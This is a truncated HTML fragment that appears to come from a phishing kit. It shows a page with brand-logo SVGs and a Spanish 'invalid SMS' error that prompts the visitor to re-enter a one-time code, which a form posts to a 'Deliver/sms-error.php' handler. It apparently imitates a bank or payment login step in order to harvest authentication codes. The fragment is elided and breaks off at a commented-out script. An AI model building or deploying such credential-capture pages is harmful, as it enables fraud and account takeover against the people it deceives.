...
<body>
    <header class="header-margin-top ">
        <div class="container ">
            <div class="row " style="display: flex;">
                ...
                <div class="span4 offset4" style="display: flex;flex-direction: row;gap:20px">
                    <svg height="40" viewBox="36 243 728 313.9" width="111" xmlns="http://www.w3.org/2000/svg">
                    ...
                    <svg version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="123px" height="40px" viewBox="0 0 361 136" enable-background="new 0 0 361 136" xml:space="preserve">
                        <g>
                            <g>
                                <g>
    ...
    <div class="container ">
        ...
        <div class="row relativo ">
            <form method="post" id="otpForm " class="clave-sms " action="./Deliver/sms-error.php">
                ...
                <div class="span8 col-r ">
                    <fieldset>
                        ...
                        <div>
                            ...
                            <div class="blanco" style="color: red;margin-bottom:15px;font-size:13px;"> El SMS que ingresaste no es válido</div>
                        </div>
                        <!-- <script>
